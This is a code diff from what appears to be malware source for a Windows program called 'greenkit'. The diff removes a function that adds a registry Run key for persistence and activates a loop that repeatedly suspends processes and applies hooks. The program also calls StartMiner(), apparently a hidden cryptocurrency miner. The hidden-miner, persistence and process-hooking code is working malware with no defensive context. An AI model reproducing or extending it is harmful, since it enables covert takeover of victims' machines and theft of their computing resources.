@@ -17,28 +17,6 @@ HINSTANCE hInst;								// current instance
 // Forward declarations of functions included in this code module:
 //ATOM				MyRegisterClass(HINSTANCE hInstance); *** KEPT ONLY AS EXAMPLE ***
 
-BOOL addRunKey() {
-    HKEY hKey;
-    LPCTSTR sk = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
-
-    LONG openRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sk, 0, KEY_ALL_ACCESS, &hKey);
-
-    if (ERROR_SUCCESS != openRes)
-        return FALSE;
-
-    LPCTSTR value = TEXT("__greenkit");
-    LPCTSTR data = "%USERPROFILE%\\Documents\\_greenkit_folder\\_greenkit_GreenKitExe.exe\0";
-
-    LONG setRes = RegSetValueEx(hKey, value, 0, REG_SZ, (LPBYTE)data, strlen(data) + 1);
-
-    if (ERROR_SUCCESS != setRes)
-        return FALSE;
-
-    LONG closeOut = RegCloseKey(hKey);
-    
-    return TRUE;
-}
-
 int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
 	_In_ LPTSTR    lpCmdLine,
@@ -49,14 +27,13 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	hInst = hInstance;
 
     StartMiner();
-    addRunKey();
-	/*while (TRUE) {
+
+	while (TRUE) {
 		process_allSuspendApplyResume(HookProcess);
 		Sleep(1000);
-		//break; // TODO remove
-	}*/
+	}
     //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5384);
-    PROCESSENTRY32 entry;
+    /*PROCESSENTRY32 entry;
     entry.dwSize = sizeof(PROCESSENTRY32);
 
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
@@ -73,5 +50,5 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                 CloseHandle(hProcess);
             }
         }
-    }
+    }*/
 }
